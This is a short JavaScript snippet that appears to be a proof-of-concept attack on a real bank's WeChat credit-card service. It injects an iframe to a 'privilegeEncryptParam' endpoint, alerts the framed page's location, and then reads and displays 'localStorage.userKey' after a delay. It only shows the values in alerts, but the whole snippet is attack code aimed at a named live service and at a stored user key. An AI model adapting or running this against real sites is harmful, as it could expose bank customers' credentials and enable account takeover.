var showIn = function(){
  $("#in").append("<iframe id=msll src='http://wx.creditcard.cmbc.com.cn/wxbankms/systemDocking/privilegeEncryptParam?keyword=msrmmc' onLoad='alert(this.contentWindow.location);'></iframe>");
  setTimeout(function(){
   alert(localStorage.userKey);
  }, 5000
  );
}
